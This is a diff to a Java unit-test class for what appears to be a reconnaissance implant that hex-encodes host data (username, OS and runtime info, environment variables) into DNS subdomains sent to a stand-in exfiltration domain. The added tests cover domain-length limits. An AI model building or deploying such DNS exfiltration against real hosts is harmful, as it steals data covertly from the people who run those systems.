@@ -18,6 +18,7 @@ public class ReconExfilTests {
     public void setImplantConfig() {
         ReconExfil.CONF_EXFIL_DNS = "abc123.test.local";
         ReconExfil.CONF_SUBDOMAIN_MAX_LEN = 63;
+        ReconExfil.CONF_DOMAIN_MAX_LEN = 253;
     }
 
     @Before
@@ -76,6 +77,35 @@ public class ReconExfilTests {
         assertEquals("Got unknown username.", decodeHex(components[1]), "unknown");
         assertEquals("Got unknown OS info.", decodeHex(components[2]), "unknown unknown");
         assertEquals("Got unknown runtime info.", decodeHex(components[3]), "unknown");
+    }
+
+    @Test
+    public void testGenerateEncodedDomainName_tooLong_skippedValue() {
+        // Arrange
+        final int uniqueIdLen = ("" + Integer.MAX_VALUE).length();
+        ReconExfil.CONF_DOMAIN_MAX_LEN = 30 + uniqueIdLen + "abd123.test.local".length();
+
+        // Act
+        ReconExfil subject = new ReconExfil();
+        String exfilDomain = subject.generateEncodedDomainName(envVars, javaProps);
+
+        // Assert
+        String[] parts = exfilDomain.split("\\.");
+        assertTrue("Some values were skipped.", parts.length < 8);
+    }
+
+    @Test
+    public void testGenerateEncodedDomainName_veryShortDomainMaxLen_noValues() {
+        // Arrange
+        ReconExfil.CONF_DOMAIN_MAX_LEN = 0;
+
+        // Act
+        ReconExfil subject = new ReconExfil();
+        String exfilDomain = subject.generateEncodedDomainName(envVars, javaProps);
+
+        // Assert
+        String[] parts = exfilDomain.split("\\.");
+        assertEquals("All values were skipped.", 4, parts.length);
     }
 
     @Test
